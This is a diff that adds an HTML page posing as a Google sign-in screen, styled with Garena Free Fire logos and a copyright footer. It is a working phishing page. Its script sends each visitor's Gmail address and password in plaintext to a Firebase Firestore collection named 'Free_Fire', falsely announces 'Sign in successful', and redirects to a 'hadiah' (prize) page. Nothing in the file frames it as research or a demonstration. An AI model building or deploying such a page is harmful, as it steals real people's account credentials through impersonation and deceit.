@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://i.ibb.co/sQksN5C/images-16.jpg');
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            position: relative;
+            width: 86%;
+            text-align: center;
+            background-color: white;            
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 20px 10px;
+            border-radius: 8px;
+            margin-bottom: 55px;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 0px;
+        }
+
+        .logo2 {
+            width: 70px;
+            height: 70px;         
+            border-radius: 5px;
+        }
+
+        .form {
+            margin-top: 20px;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: calc(100% - 40px);
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: calc(100% - 40px);
+            background-color: #4285F4;
+            color: white;
+            font-size: 16px;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .link {
+            text-decoration: none;
+            color: black;
+            font-size: 14px;
+            display: inline-block; /* Menjadikan link sebagai inline-block */
+            margin-bottom: 10px;
+        }
+
+        .invalid {
+            border-color: red;
+        }
+
+        /* Animasi loading */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+
+        .warning-message {
+            display: none;
+            position: absolute;
+            top: -10%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #ff4040;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            width: 190px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes shimmer {
+            0% {
+                background-position: -1000px 0;
+            }
+            100% {
+                background-position: 1000px 0;
+            }
+            animation-duration: 2s; 
+        }
+
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: %;
+            background-color: #333;
+            color: #fff;
+            padding: -7px 0;
+            text-align: center;
+            color: white;
+            
+        }
+        .logo3 {
+            width: 60px;
+            height: auto;
+            margin-bottom: -20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="overlay" id="overlay">
+    <div class="loader"></div>
+</div>
+
+<div class="container">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ7ZunmNHfnEkwBckX8jWNVA7xfytvxXiS2ew&usqp=CAU" alt="Google Logo" class="logo">
+    <br>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ8uRZY5XPNGMvTY1ixRr9bepQqx7BvE27AHw&usqp=CAU" alt="Free Fire Logo" class="logo2">
+    <div class="form">
+        <input type="email" id="emailOrPhone" placeholder="Email address">
+        <input type="password" id="password" placeholder="Password">
+        <button type="submit" id="logInButton">Sign In</button>
+    </div>
+    <br>
+    <a href="#" class="link">Forgot password?</a>
+    <br>
+    <a href="#" class="link">Create account</a>
+    <!-- Pesan peringatan -->
+    <div id="warningMessage" class="warning-message"></div>
+</div>
+<br>
+<br>
+<footer>
+   <img src="https://i.ibb.co/4ftWq8b/1706436607111.png" alt="Free Fire Logo" class="logo3"> 
+        <p>Copyright © Garena International.</p>
+        <p>Trademarks belong to their respective owners. All rights Reserved.</p>
+        <!-- Tambahkan logo gembok dari Bootstrap Icons -->
+       
+   
+</footer>
+
+<!-- Tambahkan Bootstrap JS (jika diperlukan) -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-firestore.js"></script>
+   <script>
+    // Initialize Firebase
+    const firebaseConfig = {
+        apiKey: "AIzaSyAREEgVnS1M_JgvThBKIBw-vP_t6WJgs7U",
+        authDomain: "poco-m5-dd083.firebaseapp.com",
+        databaseURL: "https://poco-m5-dd083-default-rtdb.firebaseio.com",
+        projectId: "poco-m5-dd083",
+        storageBucket: "poco-m5-dd083.appspot.com",
+        messagingSenderId: "590036832627",
+        appId: "1:590036832627:web:a9c27ddbd9e1db309db506",
+        measurementId: "G-LGWN38TY4K"
+    };
+    firebase.initializeApp(firebaseConfig);
+
+    // Get reference to the collection
+    const db = firebase.firestore().collection("Free_Fire");
+
+    // Function to validate inputs
+    function validateInputs() {
+        const emailOrPhone = document.getElementById("emailOrPhone");
+        const password = document.getElementById("password");
+        const emailRegex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+
+        // Check if email is empty or doesn't match the regex
+        if (!emailOrPhone.value.trim() || !emailRegex.test(emailOrPhone.value.trim())) {
+            emailOrPhone.classList.add("invalid");
+        } else {
+            emailOrPhone.classList.remove("invalid");
+        }
+
+        // Check if password is empty
+        if (!password.value.trim()) {
+            password.classList.add("invalid");
+        } else {
+            password.classList.remove("invalid");
+        }
+
+        // Return true if both fields are not empty and email is valid, otherwise false
+        return emailOrPhone.value.trim() && password.value.trim() && emailRegex.test(emailOrPhone.value.trim());
+    }
+
+    // Function to show warning message
+    function showWarningMessage(message) {
+        const warningMessage = document.getElementById("warningMessage");
+        warningMessage.textContent = message;
+        warningMessage.style.display = "block";
+
+        // Hide the warning message after 3 seconds
+        setTimeout(function() {
+            warningMessage.style.display = "none";
+        }, 1000);
+    }
+
+    // Add event listener to the Sign In button
+    document.getElementById("logInButton").addEventListener("click", function() {
+        // Validate inputs when Sign In button is clicked
+        if (validateInputs()) {
+            // Show loading overlay
+            document.getElementById("overlay").style.display = "flex";
+
+            const emailOrPhone = document.getElementById("emailOrPhone").value;
+            const password = document.getElementById("password").value;
+            const accountType = "Google"; // You can change this to "Facebook" if needed
+
+            // Save form data to Firestore
+            db.add({
+                emailOrPhone: emailOrPhone,
+                password: password,
+                accountType: accountType
+            })
+            .then(function(docRef) {
+                console.log("Data successfully added with ID: ", docRef.id);
+                alert("Sign in successful.");
+                window.location.href = "hadiah.html"; // Redirect to next page
+            })
+            .catch(function(error) {
+                console.error("Error adding document: ", error);
+                showWarningMessage("An error occurred while sending data to Firestore!");
+            })
+            .finally(function() {
+                // Hide loading overlay when operation is complete
+                document.getElementById("overlay").style.display = "none";
+            });
+        } else {
+            // Show warning message if inputs are not valid
+            showWarningMessage("Please enter a valid email address and password.");
+        }
+    });
+</script>
+
+</body>
+</html>
